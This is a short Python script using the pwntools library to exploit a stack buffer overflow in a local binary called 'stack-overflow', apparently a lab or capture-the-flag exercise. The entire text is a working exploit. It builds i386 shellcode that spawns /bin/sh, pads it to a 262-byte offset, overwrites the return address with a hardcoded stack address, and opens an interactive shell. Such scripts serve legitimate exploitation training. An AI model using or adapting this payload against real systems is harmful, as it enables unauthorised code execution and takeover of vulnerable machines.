from pwn import *


# start the vuln program
p = process('./stack-overflow')
# address of the shellcode
ret_addr = p32(0xffffcf56)
# specify the architecture and generate the shellcode to execute /bin/sh
context.arch = 'i386'
shellcode = asm(shellcraft.sh())
payload = shellcode
# add the offset
payload += b'A' * (262 - len(shellcode))
# add a new return address
payload += ret_addr
# send to process
p.sendline(payload)
#gdb.attach(p, "b *main")
# Shell
p.interactive()
